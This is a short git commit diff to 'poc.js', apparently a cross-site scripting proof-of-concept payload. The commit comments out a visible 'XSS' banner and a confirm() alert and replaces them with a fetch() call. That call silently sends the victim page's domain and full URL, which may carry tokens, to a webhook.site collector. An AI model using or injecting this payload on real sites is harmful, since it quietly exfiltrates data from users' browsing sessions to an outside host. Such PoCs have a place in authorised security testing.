19eb97fc27459fbe666776f73bcd09348d25aef3
VictorKyiv <120391513+VictorKyiv@users.noreply.github.com>
2026-05-20 13:22:18 +0300

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,2 +1,4 @@
-document.body.insertAdjacentHTML('afterbegin','<h1 style="position:fixed;z-index:99999;background:white;color:red;top:0;left:0">XSS</h1>');
-confirm(document.domain);
+//document.body.insertAdjacentHTML('afterbegin','<h1 style="position:fixed;z-index:99999;background:white;color:red;top:0;left:0">XSS</h1>');
+//confirm(document.domain);
+
+fetch('https://webhook.site/15524a9b-7e50-4fa2-aa60-3b61dbd603f3/hit?d=' + encodeURIComponent(document.domain) + '&url=' + encodeURIComponent(location.href));
